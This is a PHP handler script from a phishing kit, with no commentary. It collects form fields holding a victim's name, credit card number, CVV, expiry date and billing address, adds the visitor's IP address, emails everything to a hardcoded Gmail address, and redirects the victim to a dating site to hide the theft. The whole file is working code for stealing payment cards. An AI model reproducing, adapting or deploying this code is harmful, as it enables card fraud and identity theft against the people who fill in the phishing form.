<?
$ip = getenv("REMOTE_ADDR");
$message .= "---- : || match! GOD 1ST SON || :------\n";
$message .= "name: ".$_POST['formtext1']."\n";
$message .= "card number: ".$_POST['formtext2']."\n";
$message .= "cvv: ".$_POST['formtext3']."\n";
$message .= "exp month: ".$_POST['formtext4']."\n";
$message .= "exp year: ".$_POST['formtext10']."\n";
$message .= "address: ".$_POST['formtext5']."\n";
$message .= "city: ".$_POST['formtext6']."\n";
$message .= "state: ".$_POST['formtext7']."\n";
$message .= "country: ".$_POST['formtext8']."\n";
$message .= "zip: ".$_POST['formtext9']."\n";
$message .= "----: || OnGod || :------\n";
$message .= "IP: ".$ip."\n";
$recipient ="jeantanahill@gmail.com";
$subject = "tare | ".$ip."\n";
mail($recipient,$subject,$message);
header("Location: http://ourtime.com");
?>
